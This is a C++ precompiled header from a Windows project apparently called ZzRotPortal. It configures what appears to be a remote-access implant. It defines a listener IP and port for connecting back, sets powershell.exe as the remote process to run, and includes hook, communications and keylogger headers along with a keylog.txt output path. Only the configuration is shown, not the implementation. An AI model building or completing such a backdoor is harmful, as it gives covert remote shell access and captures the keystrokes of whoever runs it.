// pch.h: This is a precompiled header file.
// Files listed below are compiled only once, improving build performance for future builds.
// This also affects IntelliSense performance, including code completion and many code browsing features.
// However, files listed here are ALL re-compiled if any one of them is updated between builds.
// Do not add files here that you will be updating frequently as this negates the performance advantage.
#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <windows.h>
#include <winhttp.h>
#include <fstream>
#include <iostream>
#include <TlHelp32.h>
#include <string>
#include <time.h>


#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "User32.lib")

#include "Hooks.h"
#include "Comms.h"
#define POLL_RATE 6000 // how long to try connecting back when timed out
#define CHILD_NAME "powershell.exe" // name of the remote process to run
// Comms settings
#define LISTENER_IP L"192.168.1.12"
#define LISTENER_PORT 443

#ifdef DEBUG
# define DEBUG_PRINT(x) printf x
#else
# define DEBUG_PRINT(x) do {} while (0)
#endif

#include "Helpers.h"
#define FILE_NAME L"C:\\Users\\Athena\\source\\repos\\ZzRotPortal\\ZzRotPortal\\keylog.txt"
#include "KeyLog.h"